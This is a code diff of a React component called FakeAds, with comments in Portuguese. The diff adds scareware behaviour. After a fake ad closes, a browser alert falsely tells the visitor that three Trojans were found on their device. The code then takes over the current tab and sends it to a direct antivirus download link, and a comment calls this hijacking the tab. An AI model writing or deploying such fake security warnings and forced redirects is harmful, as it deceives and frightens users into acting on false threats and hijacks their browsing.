@@ -58,15 +58,16 @@ export default function FakeAds() {
 
   // NOVA LÓGICA DE SUSTO: Não usamos mais window.open aqui!
   const handleScareTactics = () => {
-    setIsVisible(false) // Some com o anúncio
+    setIsVisible(false)
     
-    // Agenda o próximo anúncio
     setTimeout(showRandomAd, 20000)
 
-    // Atraso de 100ms para garantir que a aba do Avast abra PRIMEIRO nativamente.
-    // Depois o alerta trava a tela antiga kkkk.
     setTimeout(() => {
+      // 1. O navegador pausa tudo e exibe a mensagem
       alert('⚠️ AMEAÇA DETECTADA! Seu dispositivo foi exposto a 3 Cavalos de Troia.\n\nVocê será redirecionado para instalar um Antivírus imediatamente.')
+      
+      // 2. Assim que ele clica em "OK", esta linha executa e sequestra a aba atual!
+      window.location.href = 'https://www.avast.com/pt-br/download-thank-you.php?product=AVAST-ONE-MOD-WIN-AV-FAD&locale=pt-br&direct=1'
     }, 100)
   }
 
